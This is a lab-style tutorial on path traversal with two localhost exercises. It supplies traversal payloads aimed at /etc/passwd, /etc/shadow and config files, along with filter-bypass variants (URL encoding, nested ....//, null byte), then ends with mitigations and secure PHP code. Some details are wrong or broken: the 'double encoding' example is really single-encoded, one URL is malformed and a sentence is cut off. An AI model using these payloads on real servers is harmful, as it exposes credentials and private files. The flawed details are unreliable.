Path Traversal / Directory Traversal

Difficulty: Easy Risk Level: Critical

What is Path Traversal?

Path Traversal (Directory Traversal) is a web security vulnerability that allows attackers to access files and directories stored outside the web root folder. By manipulating variables that reference files with "dot-dot-slash (../)" sequences and encoded variations, attackers can access arbitrary files on the server.

Common Targets:

../../../etc/passwd # Linux user accounts
../../../etc/shadow # Linux password hashes
../../../../var/www/html/config.php # Web config files
../../../var/www/html/request.js # Target file

LAB 1: Basic Path Traversal (../../../ sequence)

Vulnerable Endpoint: File Viewer (No Input Validation)

This endpoint directly uses user input in file operations without any validation, making it vulnerable to basic path traversal attacks.

Vulnerable URL Pattern:
http://127.0.0.1:5000
Example: http://localhost:5000/backend/easy.php?file=avatar.jpg

SOLUTION: Basic Path Traversal

Objective: Follow the Instructions

Step 1: Right Click on a image and open in new tab

Step 2: First, determine the correct depth of traversal:

Try : "/"
/etc/passwd
/etc/os-release

Step 2: Once you confirm it works, try other files

try /opt/ or /etc/ or /bin

Step 3: Find the flag.txt

http://127.0.0.1:5000/display?image=?file=../flag.txt # You may need to add multiple ../../ to get the flag

Step-by-Step Exploitation:

  1. Identify the Entry Point : The user looks at the website URL and notices it asks for a specific file, like ?image=tool1.jpg
  2. Test the Boundaries : The user tries to change the filename to ../flag.txt to see if the server will look "outside" the images folder
  3. Climb the Folders : The user adds more sets of ../ one by one (like climbing a ladder) until they reach the exact folder depth where the flag is hidden
  4. Read the Secret : Since the code blindly follows the path ../../../../flag.txt, the server leaves the "safe" web area, finds the secret file on the hard driv

LAB 2: Encoded Path Traversal (URL Encoding Bypass)

Vulnerable Endpoint: Medium Security (Basic Filtering)

This endpoint has basic filtering that removes "../" sequences. You need to use encoding techniques to bypass the filter.

Vulnerable URL Pattern:
http://localhost:7000/backend/medium.php?file=FILENAME
Filter: Removes "../" sequences (can be bypassed)

SOLUTION: Encoded Path Traversal

Objective: Create file at /var/www/html/request.js (bypass filter)

URL Encoding Reference:

. (dot) = %2E
/ (slash) = %2F
.. = %2E%2E
../ = %2E%2E%2F

Method 1: Single URL Encoding

..%2F..%2F..%2F..%2Fvar%2Fwww%2Fhtml%2Frequest.js
http://localhost:7000/backend/medium.php?file=..%2F..%2F..%2F..%2Fvar%2Fwww%2Fhtml%2Frequest.js

Method 2: Double Encoding (if single encoded is filtered)

..%2F..%2F..%2F..%2Fvar%2Fwww%2Fhtml%2Frequest.js

Method 3: Nested Traversal (bypass ../ removal)

....//....//....//....//var/www/html/request.js

Method 4: Mixed Encoding + Null Byte

..%2F..%2F..%2F..%2Fvar%2Fwww%2Fhtml%2Frequest.js%00.jpg

Step-by-Step Bypass Techniques:

  1. Test filter: Try basic ../../../etc/passwd
  2. Single encode: Use URL encoded version %2E%2E%2F
  3. Double encode: If single encoded is blocked, try %2E%2E%2F
  4. Nested: Try ....//....// pattern (filter removes ../ but misses ....//)
  5. Null byte: Add %00 to truncate any appended extensions

Tip: Test each method until one works. Different servers have different filters.

How to Mitigate Path Traversal

Technique Implementation
Input Validation if (preg_match('/^[a-zA-Z0-9_\-\.]+$/', $file)) { ... }
Path Canonicalization $real = realpath('/base/dir/' . $file);
if (strpos($real, '/base/dir') !== 0) { die(); }
Whitelist Files $allowed = ['file1.txt', 'file2.jpg'];
if (!in_array($file, $allowed)) { die(); }
Database Storage Store files as BLOBs in database
Access via ID, not filename

Secure Code Example:

// Secure file access
function getFile($filename) {
    // Whitelist characters
    if (!preg_match('/^[a-z0-9_\-\.]+$/i', $filename)) {
        return "Invalid";
    }

    // Base directory
    $base = '/var/www/html/uploads/';

    // Canonicalize
    $path = realpath($base . $filename);

    // Verify path
    if ($path === false || strpos($path, $base) !== 0) {
        return "Denied";
    }

    return file_get_contents($path);
}
